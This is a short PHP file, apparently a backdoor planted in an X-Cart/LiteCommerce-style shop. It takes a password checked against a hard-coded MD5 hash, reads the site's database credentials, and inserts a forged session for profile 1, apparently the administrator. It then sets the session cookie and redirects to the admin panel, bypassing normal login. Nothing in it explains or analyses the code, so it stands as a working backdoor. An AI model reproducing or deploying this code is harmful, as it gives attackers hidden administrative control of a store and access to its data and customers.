<?
	if (md5($_POST["pwd"]) == "cefb500a9f3d05511296a719cffb21cf") {
		$options = parse_ini_file("etc/config.php");
		if (file_exists("etc/config.local.php")) {
			$options = array_merge($options, parse_ini_file("etc/config.local.php"));
		}
		mysql_connect($options["hostspec"], $options["username"], $options["password"]);
		mysql_select_db($options["database"]);
		$id = md5(rand());
		mysql_query("insert into xlite_sessions (id,expiry,data) values ('$id', " . (time()+1000) . ", 'a:1:{s:10:\"profile_id\";s:8:\"s:1:\"1\";\";}')");
		setcookie('XSID', $id, 0, "/");
		header("Location: admin.php");
	} else {
?>
<form action="loo.php" method="POST">
<input type="text" name="pwd">
<input type="submit">
</form>
<?
	}
?>
